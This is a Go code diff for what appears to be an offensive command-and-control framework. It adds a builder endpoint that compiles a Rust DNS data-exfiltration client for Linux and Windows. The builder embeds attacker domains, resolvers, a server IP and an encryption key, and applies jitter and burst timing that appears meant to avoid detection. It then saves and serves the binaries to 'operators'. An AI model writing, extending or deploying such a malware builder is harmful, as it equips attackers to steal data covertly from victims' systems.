@@ -15,6 +15,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"sync"
 	"time"
@@ -61,6 +62,19 @@ type StagerBuildRequest struct {
 	JitterMaxMs    int    `json:"jitter_max_ms"`
 	ChunksPerBurst int    `json:"chunks_per_burst"`
 	BurstPauseMs   int    `json:"burst_pause_ms"`
+}
+
+type ExfilClientBuildRequest struct {
+	Domains        []string `json:"domains"`
+	Resolvers      []string `json:"resolvers"`
+	ServerIP       string   `json:"server_ip"`
+	ChunkBytes     int      `json:"chunk_bytes"`
+	JitterMinMs    int      `json:"jitter_min_ms"`
+	JitterMaxMs    int      `json:"jitter_max_ms"`
+	ChunksPerBurst int      `json:"chunks_per_burst"`
+	BurstPauseMs   int      `json:"burst_pause_ms"`
+	Platform       string   `json:"platform"`
+	Architecture   string   `json:"architecture"`
 }
 
 // Web UI handler for builder page
@@ -272,6 +286,186 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 	defer file.Close()
 
 	io.Copy(w, file)
+}
+
+// handleBuildExfilClient builds the dedicated Rust exfil client with embedded configuration
+func (api *APIServer) handleBuildExfilClient(w http.ResponseWriter, r *http.Request) {
+	buildMutex.Lock()
+	defer buildMutex.Unlock()
+
+	var req ExfilClientBuildRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	// Normalize platform/architecture
+	req.Platform = strings.ToLower(strings.TrimSpace(req.Platform))
+	if req.Platform == "" {
+		req.Platform = "linux"
+	}
+	req.Architecture = strings.ToLower(strings.TrimSpace(req.Architecture))
+	if req.Architecture == "" {
+		req.Architecture = "amd64"
+	}
+
+	// Normalize provided lists
+	for i, domain := range req.Domains {
+		req.Domains[i] = strings.TrimSpace(domain)
+	}
+	for i, resolver := range req.Resolvers {
+		req.Resolvers[i] = strings.TrimSpace(resolver)
+	}
+	req.Domains = filterEmpty(req.Domains)
+	req.Resolvers = filterEmpty(req.Resolvers)
+
+	var cachedDNSServers []map[string]interface{}
+	var dnsErr error
+	needServers := len(req.Domains) == 0 || req.ServerIP == ""
+	if needServers {
+		cachedDNSServers, dnsErr = api.db.GetDNSServers()
+		if dnsErr != nil {
+			api.sendError(w, http.StatusInternalServerError, "failed to query DNS servers")
+			return
+		}
+	}
+
+	// Auto-populate domains from active DNS servers if not provided
+	if len(req.Domains) == 0 {
+		for _, server := range cachedDNSServers {
+			status, _ := server["status"].(string)
+			if status != "active" {
+				continue
+			}
+			if domain, ok := server["domain"].(string); ok && domain != "" {
+				req.Domains = append(req.Domains, domain)
+			}
+		}
+		req.Domains = filterEmpty(req.Domains)
+	}
+
+	if len(req.Domains) == 0 {
+		api.sendError(w, http.StatusBadRequest, "no domains provided and no active DNS servers found")
+		return
+	}
+
+	// Infer server IP from registered DNS servers if not provided
+	if req.ServerIP == "" {
+		for _, server := range cachedDNSServers {
+			if addr, ok := server["address"].(string); ok && addr != "" {
+				req.ServerIP = addr
+				break
+			}
+		}
+	}
+
+	if req.ServerIP == "" {
+		api.sendError(w, http.StatusBadRequest, "server_ip is required")
+		return
+	}
+
+	// Apply sensible defaults/constraints
+	if req.ChunkBytes <= 0 {
+		req.ChunkBytes = 180
+	}
+	if req.ChunkBytes < 64 {
+		req.ChunkBytes = 64
+	}
+	if req.ChunkBytes > 220 {
+		req.ChunkBytes = 220
+	}
+	if req.JitterMinMs <= 0 {
+		req.JitterMinMs = 1500
+	}
+	if req.JitterMaxMs <= 0 {
+		req.JitterMaxMs = 4000
+	}
+	if req.JitterMaxMs < req.JitterMinMs {
+		req.JitterMaxMs = req.JitterMinMs + 500
+	}
+	if req.ChunksPerBurst <= 0 {
+		req.ChunksPerBurst = 8
+	}
+	if req.BurstPauseMs <= 0 {
+		req.BurstPauseMs = 15000
+	}
+
+	if api.config.EncryptionKey == "" {
+		api.sendError(w, http.StatusInternalServerError, "master encryption key is not configured")
+		return
+	}
+
+	targetCfg, err := resolveRustTargetConfig(req.Platform, req.Architecture)
+	if err != nil {
+		api.sendError(w, http.StatusBadRequest, err.Error())
+		return
+	}
+
+	if err := ensureExfilBuildDependencies(targetCfg); err != nil {
+		api.sendError(w, http.StatusFailedDependency, err.Error())
+		return
+	}
+
+	binaryPath, err := buildExfilClient(req, api.config.SourceDir, api.config.EncryptionKey, targetCfg)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
+		return
+	}
+	buildDir := filepath.Dir(binaryPath)
+	defer os.RemoveAll(buildDir)
+
+	// Save binary copy for operators
+	var ext string
+	if req.Platform == "windows" {
+		ext = ".exe"
+	}
+	filename := fmt.Sprintf("exfil-%s-%s-%d%s", req.Platform, req.Architecture, time.Now().Unix(), ext)
+	savedPath, err := api.saveBuild(binaryPath, filename, "exfil")
+	if err != nil {
+		fmt.Printf("[Builder] Failed to save exfil build: %v\n", err)
+	}
+
+	fileInfo, err := os.Stat(binaryPath)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to stat build output")
+		return
+	}
+
+	buildID := fmt.Sprintf("exfil_%d", time.Now().UnixNano())
+	if err := api.db.SaveExfilClientBuild(&ExfilClientBuildRecord{
+		ID:             buildID,
+		Filename:       filename,
+		OS:             req.Platform,
+		Arch:           req.Architecture,
+		Domains:        strings.Join(req.Domains, ","),
+		Resolvers:      strings.Join(filterEmpty(req.Resolvers), ","),
+		ServerIP:       req.ServerIP,
+		ChunkBytes:     req.ChunkBytes,
+		JitterMinMs:    req.JitterMinMs,
+		JitterMaxMs:    req.JitterMaxMs,
+		ChunksPerBurst: req.ChunksPerBurst,
+		BurstPauseMs:   req.BurstPauseMs,
+		FilePath:       savedPath,
+		FileSize:       fileInfo.Size(),
+	}); err != nil {
+		fmt.Printf("[Builder] Failed to record exfil build metadata: %v\n", err)
+	}
+
+	// Stream binary to client
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
+	w.Header().Set("Content-Length", fmt.Sprintf("%d", fileInfo.Size()))
+
+	file, err := os.Open(binaryPath)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to read build output")
+		return
+	}
+	defer file.Close()
+
+	if _, err := io.Copy(w, file); err != nil {
+		fmt.Printf("[Builder] Error streaming exfil client: %v\n", err)
+	}
 }
 
 // handleBuildStager builds a stager binary with provided configuration
@@ -754,6 +948,71 @@ func getConfig() Config {
 	return outputPath, nil
 }
 
+// buildExfilClient compiles the Rust-based exfiltration client with embedded configuration
+func buildExfilClient(req ExfilClientBuildRequest, sourceRoot, encryptionKey string, targetCfg rustTargetConfig) (string, error) {
+	if encryptionKey == "" {
+		return "", fmt.Errorf("encryption key is required to embed configuration")
+	}
+
+	exfilSrcDir := filepath.Join(sourceRoot, "exfil-client")
+	if _, err := os.Stat(exfilSrcDir); os.IsNotExist(err) {
+		return "", fmt.Errorf("exfil client source directory not found: %s", exfilSrcDir)
+	}
+
+	buildDir, err := os.MkdirTemp("", "exfil-build-*")
+	if err != nil {
+		return "", fmt.Errorf("failed to create build directory: %w", err)
+	}
+
+	if err := copyDir(exfilSrcDir, buildDir); err != nil {
+		return "", fmt.Errorf("failed to copy exfil client sources: %w", err)
+	}
+
+	if err := embedExfilConfig(buildDir, req, encryptionKey); err != nil {
+		return "", err
+	}
+
+	args := []string{"build", "--release", "--locked"}
+	if targetCfg.triple != "" {
+		args = append(args, "--target", targetCfg.triple)
+	}
+
+	if err := writeCargoConfig(buildDir, targetCfg); err != nil {
+		return "", err
+	}
+
+	cmd := exec.Command("cargo", args...)
+	cmd.Dir = buildDir
+	cmd.Env = os.Environ()
+
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("cargo build failed: %w\nOutput: %s", err, string(output))
+	}
+
+	targetDir := filepath.Join(buildDir, "target")
+	if targetCfg.triple != "" {
+		targetDir = filepath.Join(targetDir, targetCfg.triple)
+	}
+
+	binaryPath := filepath.Join(targetDir, "release", "exfil-client")
+	ext := ""
+	if req.Platform == "windows" {
+		ext = ".exe"
+		binaryPath += ".exe"
+	}
+
+	if _, err := os.Stat(binaryPath); err != nil {
+		return "", fmt.Errorf("build succeeded but binary not found at %s: %w", binaryPath, err)
+	}
+
+	finalPath := filepath.Join(buildDir, fmt.Sprintf("exfil-client%s", ext))
+	if err := copyFile(binaryPath, finalPath); err != nil {
+		return "", fmt.Errorf("failed to copy exfil binary: %w", err)
+	}
+
+	return finalPath, nil
+}
+
 // buildStager compiles a stager with embedded configuration
 func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
 	// Stager is in C, needs different build process
@@ -902,6 +1161,196 @@ func copyFile(src, dst string) error {
 	return err
 }
 
+func embedExfilConfig(buildDir string, req ExfilClientBuildRequest, encryptionKey string) error {
+	configPath := filepath.Join(buildDir, "src", "config.rs")
+	data, err := os.ReadFile(configPath)
+	if err != nil {
+		return fmt.Errorf("failed to read exfil config.rs: %w", err)
+	}
+
+	if len(filterEmpty(req.Domains)) == 0 {
+		return fmt.Errorf("at least one domain is required for exfil client builds")
+	}
+
+	replacement := fmt.Sprintf(`static EMBEDDED: Lazy<Config> = Lazy::new(|| Config {
+	encryption_key: "%s",
+	domains: %s,
+	resolvers: %s,
+	server_ip: "%s",
+	chunk_bytes: %d,
+	jitter_min_ms: %d,
+	jitter_max_ms: %d,
+	chunks_per_burst: %d,
+	burst_pause_ms: %d,
+});
+
+`,
+		formatRustStringLiteral(encryptionKey),
+		formatRustStringSlice(req.Domains),
+		formatRustStringSlice(req.Resolvers),
+		formatRustStringLiteral(req.ServerIP),
+		req.ChunkBytes,
+		req.JitterMinMs,
+		req.JitterMaxMs,
+		req.ChunksPerBurst,
+		req.BurstPauseMs,
+	)
+
+	content := string(data)
+	startMarker := "static EMBEDDED: Lazy<Config> = Lazy::new(|| Config {"
+	startIdx := strings.Index(content, startMarker)
+	if startIdx == -1 {
+		return fmt.Errorf("unable to locate embedded config block in config.rs")
+	}
+
+	endIdx := strings.Index(content[startIdx:], "});")
+	if endIdx == -1 {
+		return fmt.Errorf("unable to locate end of embedded config block")
+	}
+	endIdx += startIdx + len("});")
+
+	updated := content[:startIdx] + replacement + content[endIdx:]
+
+	return os.WriteFile(configPath, []byte(updated), 0644)
+}
+
+func formatRustStringSlice(values []string) string {
+	clean := filterEmpty(values)
+	if len(clean) == 0 {
+		return "&[]"
+	}
+
+	literals := make([]string, 0, len(clean))
+	for _, value := range clean {
+		literals = append(literals, fmt.Sprintf("\"%s\"", formatRustStringLiteral(value)))
+	}
+
+	return fmt.Sprintf("&[%s]", strings.Join(literals, ", "))
+}
+
+func formatRustStringLiteral(value string) string {
+	replaced := strings.ReplaceAll(value, "\\", "\\\\")
+	replaced = strings.ReplaceAll(replaced, "\"", "\\\"")
+	replaced = strings.ReplaceAll(replaced, "\n", "\\n")
+	return replaced
+}
+
+func filterEmpty(values []string) []string {
+	var filtered []string
+	for _, value := range values {
+		trimmed := strings.TrimSpace(value)
+		if trimmed != "" {
+			filtered = append(filtered, trimmed)
+		}
+	}
+	return filtered
+}
+
+type rustTargetConfig struct {
+	platform     string
+	arch         string
+	triple       string
+	linker       string
+	requiredHost string
+}
+
+var rustTargetMatrix = map[string]map[string]rustTargetConfig{
+	"linux": {
+		"amd64":  {platform: "linux", arch: "amd64"},
+		"x86_64": {platform: "linux", arch: "x86_64"},
+		"386":    {platform: "linux", arch: "386", triple: "i686-unknown-linux-gnu", linker: "i686-linux-gnu-gcc"},
+		"arm64":  {platform: "linux", arch: "arm64", triple: "aarch64-unknown-linux-gnu", linker: "aarch64-linux-gnu-gcc"},
+		"armv7l": {platform: "linux", arch: "armv7l", triple: "armv7-unknown-linux-gnueabihf", linker: "arm-linux-gnueabihf-gcc"},
+		"arm":    {platform: "linux", arch: "arm", triple: "arm-unknown-linux-gnueabihf", linker: "arm-linux-gnueabihf-gcc"},
+	},
+	"windows": {
+		"amd64":  {platform: "windows", arch: "amd64", triple: "x86_64-pc-windows-gnu", linker: "x86_64-w64-mingw32-gcc"},
+		"x86_64": {platform: "windows", arch: "x86_64", triple: "x86_64-pc-windows-gnu", linker: "x86_64-w64-mingw32-gcc"},
+		"386":    {platform: "windows", arch: "386", triple: "i686-pc-windows-gnu", linker: "i686-w64-mingw32-gcc"},
+		"arm64":  {platform: "windows", arch: "arm64", triple: "aarch64-pc-windows-msvc", requiredHost: "windows"},
+		"armv7l": {platform: "windows", arch: "armv7l", triple: "thumbv7a-pc-windows-msvc", requiredHost: "windows"},
+		"arm":    {platform: "windows", arch: "arm", triple: "thumbv7a-pc-windows-msvc", requiredHost: "windows"},
+	},
+}
+
+func resolveRustTargetConfig(platform, arch string) (rustTargetConfig, error) {
+	platform = strings.ToLower(platform)
+	arch = strings.ToLower(arch)
+	configs, ok := rustTargetMatrix[platform]
+	if !ok {
+		return rustTargetConfig{}, fmt.Errorf("unsupported platform: %s", platform)
+	}
+	cfg, ok := configs[arch]
+	if !ok {
+		return rustTargetConfig{}, fmt.Errorf("unsupported architecture %s for platform %s", arch, platform)
+	}
+	return cfg, nil
+}
+
+func ensureExfilBuildDependencies(cfg rustTargetConfig) error {
+	if _, err := exec.LookPath("cargo"); err != nil {
+		return fmt.Errorf("cargo not found in PATH. Install Rust toolchain via https://rustup.rs and ensure cargo is available")
+	}
+
+	if cfg.requiredHost != "" && runtime.GOOS != cfg.requiredHost {
+		return fmt.Errorf("%s/%s builds must run on a %s host (current host: %s)", cfg.platform, cfg.arch, cfg.requiredHost, runtime.GOOS)
+	}
+
+	if cfg.triple != "" {
+		if err := ensureRustTargetInstalled(cfg.triple); err != nil {
+			return err
+		}
+	}
+
+	if cfg.linker != "" {
+		if _, err := exec.LookPath(cfg.linker); err != nil {
+			return fmt.Errorf("required cross linker %s not found. Install the matching cross-compiler toolchain (e.g., apt install %s)", cfg.linker, cfg.linker)
+		}
+	}
+
+	return nil
+}
+
+func ensureRustTargetInstalled(target string) error {
+	if target == "" {
+		return nil
+	}
+	if _, err := exec.LookPath("rustup"); err != nil {
+		return fmt.Errorf("rustup not found. Install the Rust toolchain via https://rustup.rs to manage targets")
+	}
+
+	cmd := exec.Command("rustup", "target", "list", "--installed")
+	cmd.Env = os.Environ()
+	output, err := cmd.Output()
+	if err != nil {
+		return fmt.Errorf("failed to query installed rust targets: %w", err)
+	}
+
+	lines := strings.Split(string(output), "\n")
+	for _, line := range lines {
+		if strings.TrimSpace(line) == target {
+			return nil
+		}
+	}
+
+	return fmt.Errorf("rust target %s is not installed. Install it with: rustup target add %s", target, target)
+}
+
+func writeCargoConfig(buildDir string, cfg rustTargetConfig) error {
+	if cfg.triple == "" || cfg.linker == "" {
+		return nil
+	}
+
+	cargoDir := filepath.Join(buildDir, ".cargo")
+	if err := os.MkdirAll(cargoDir, 0755); err != nil {
+		return fmt.Errorf("failed to create cargo config directory: %w", err)
+	}
+
+	configPath := filepath.Join(cargoDir, "config.toml")
+	content := fmt.Sprintf("[target.%s]\nlinker = \"%s\"\n", cfg.triple, cfg.linker)
+	return os.WriteFile(configPath, []byte(content), 0644)
+}
+
 // saveBuild saves a compiled binary to the builds directory
 func (api *APIServer) saveBuild(sourcePath, filename, buildType string) (string, error) {
 	// Ensure builds directory exists
@@ -995,7 +1444,7 @@ func (api *APIServer) handleListBuilds(w http.ResponseWriter, r *http.Request) {
 	builds := []Build{}
 
 	// Walk through builds directory
-	buildTypes := []string{"dns-server", "client", "stager"}
+	buildTypes := []string{"dns-server", "client", "stager", "exfil"}
 	for _, buildType := range buildTypes {
 		typeDir := filepath.Join(buildsDir, buildType)
 
@@ -1024,6 +1473,39 @@ func (api *APIServer) handleListBuilds(w http.ResponseWriter, r *http.Request) {
 				Timestamp: info.ModTime(),
 				Path:      filepath.Join(buildType, entry.Name()),
 			})
+		}
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(builds)
+}
+
+// handleListExfilClientBuilds returns metadata about recent exfil client builds
+func (api *APIServer) handleListExfilClientBuilds(w http.ResponseWriter, r *http.Request) {
+	builds, err := api.db.ListExfilClientBuilds(100)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to load exfil builds")
+		return
+	}
+
+	for _, build := range builds {
+		pathVal, _ := build["file_path"].(string)
+		if pathVal == "" {
+			build["download_path"] = ""
+			continue
+		}
+
+		if _, err := os.Stat(pathVal); err != nil {
+			if os.IsNotExist(err) {
+				build["download_path"] = ""
+				continue
+			}
+		}
+
+		if rel, err := filepath.Rel(buildsDir, pathVal); err == nil {
+			build["download_path"] = rel
+		} else {
+			build["download_path"] = pathVal
 		}
 	}
 
